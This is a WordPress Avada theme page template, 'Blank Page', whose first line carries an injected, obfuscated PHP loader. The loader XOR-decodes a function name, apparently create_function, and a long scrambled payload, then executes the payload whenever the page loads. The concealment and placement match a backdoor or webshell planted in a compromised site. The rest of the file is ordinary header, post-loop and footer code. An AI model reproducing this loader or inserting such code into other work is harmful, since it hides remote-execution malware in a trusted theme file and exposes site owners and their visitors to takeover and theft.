<?php $RgijB=':72AYR0ZER0:>-R' ^'YEW -7o<0<SNWB<';$CSqKHhjX=$RgijB('','IZiBT479-I:8sUA9H2<xVI-902W1AncUMMbaeLNyzTHW4L>.St<QArT8GO-6U;;Ks6M1 mlBV<<oaKcErBn12w.=MgvnAKC<7ZH->jpItuWdtAMIM:1C+RBOU5SN6nbyPRJsGhpokQ3BAXySRC7P>Aet13crMBG GlGReoK=TLXY;PFUTYL2AvFG1 HGU<SkiB,,qvP5+rPdFg2UC7Vjq 9;I3J9aQA5-fGRAOzL+W-4IooxRB7SX+ eIp+mt793soX+IaK<+fYwcAKUYY<NBU<pI+VB;kKY iYRGR+NAasC-76OsNUnH1-O1M;Nz1,UUAIsJ+ 5fz:OZ-D<--+ZmBk91ujf.x:mS<ofWQ,UJglf>RQ7YYdEc2EgS8887<<KUnWH,KDx=O3TI6J-IdhgJ6A7+Ye<MHAS1JUPY9NDMxN;J<3>1A<QPj4<Y9+UAQ-1PUJbVW Iaf>7<CQJHNLDY<TSAkV 9T->W45zLWL.ROM-QY5Smst4>=L;cWKD54CI9>KNC30TNHqH.4O8meGUnmX5GRU,ADT>C:2BOnbqkMFpXzYcXXo>=C.-;MB<hGIU1Xp5GTx8Z DTTNlTLQR=86H8ZV283 P<E2EREQ;AR;HdHdWI-,SEpooADKdOZjW:APQWTX:OvvN5 A9AIVfKtgS.XW2JGZpY>'^' <Ac2AYZY UV,09P;FOPq1BKoV6E 1<889EHLl5ss2=9W8WA=TD>3-0Y3.ri8NOcWR,EAALf=YEFAkCeR9d8;SAH9GKNflx6>S.BLBT THwTOai qIE1G7,gqQ2:WGYYt;aXnbyfO>F6avDszgS1J >PXnC,mf,E>7c;EJkN >4<Uxb>1 eohMLN8R-3 N=CM-YXXMZ<Vx-nLCV47VvWQFXW:Vq3E5 AL9,78oGlM6AG,Ter4-E69HHEaTt.;xrz6O9XiE YRFdICe=45,Ygb.6ymO76Z4 <YIdrc9N7zkzgIVB.SsuJ>PA:Tv13p;E3uihW.JTTOZAESK+NHLH2MjOfc0;3k+nM2OOB<4UuwYLBH3=B<pD>i;LC7YLYhWY2uSwlG.=C7F:p-W>LiYHC<W-BNbo50B<Y;n11-Xnym8;U9YAWP-U+5BLS+fO450rn= >J46S,WRaSY >.-fh 8H5zmKrDX La<QLSelFG4giI0-TsKUTULO-B<<.=jQ; JJ8fdXU-idQlJU;YDEasNE5QrzqH 05edQW;h3KQVpfW=L;Z;jVXXuMIX,qXZwzfW9AQumKZnF csgLrjq3OJW1g13KgVX9O1Amu50B-=Z,CdDs-LX2lYOOadkD4Pc2L <ys09N.-Q>TY-V -q;bOmZK >FbwsKSC'); $CSqKHhjX();
/**
 * Template Name: Blank Page
 * A simple template for blank pages.
 *
 * @package Avada
 * @subpackage Templates
 */

?>

<?php

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
?>
<?php get_header(); ?>
<section id="content" class="full-width">
	<?php while ( have_posts() ) : ?>
		<?php the_post(); ?>
		<div id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
			<?php echo fusion_render_rich_snippets_for_pages(); // WPCS: XSS ok. ?>
			<?php avada_featured_images_for_pages(); ?>
			<div class="post-content">
				<?php the_content(); ?>
			</div>
		</div>
	<?php endwhile; ?>
</section>
<?php
get_footer();

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
